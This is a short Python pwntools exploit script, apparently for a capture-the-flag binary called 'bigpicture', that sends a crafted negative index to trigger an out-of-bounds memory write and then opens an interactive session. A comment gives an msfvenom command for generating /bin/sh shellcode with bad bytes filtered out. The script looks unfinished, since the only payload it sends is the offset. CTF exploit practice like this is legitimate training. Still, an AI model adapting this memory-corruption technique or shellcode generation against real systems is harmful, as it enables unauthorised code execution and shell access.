#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-04-22 08:07:23
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils
from pwn import *
context(log_level="debug")
DEBUG = 1
target = "./bigpicture"
remote_ip = ""
port = 0
rop = roputils.ROP(target)
# bss = rop.section('.bss')
# rop.got('puts')
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'


if DEBUG:
	p = process(target)
	gdb.attach(p,"b*main\nc")
else:
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)

ru("big? ")
sl("5x5")
ru("> ")
sl("-"+str(0x1000000-0x800000)+",1,1")

p.interactive()